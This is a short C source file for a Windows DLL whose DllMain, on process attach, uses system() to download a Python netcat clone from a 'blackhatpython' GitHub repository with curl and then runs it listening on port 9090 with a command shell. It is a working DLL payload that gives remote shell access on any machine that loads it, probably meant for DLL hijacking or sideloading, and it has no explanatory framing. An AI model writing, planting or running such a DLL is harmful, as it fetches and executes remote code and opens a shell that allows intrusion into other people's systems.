#include <windows.h>

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
            int i;
            i = system ("curl https://raw.githubusercontent.com/stackviolator/blackhatpython/main/networking/netcat/netcat.py -o .\\nc.py");
            i = system ("python .\\nc.py -t 10.118.53.64 -l -c -p 9090");
            break;
    }
    return TRUE;
}
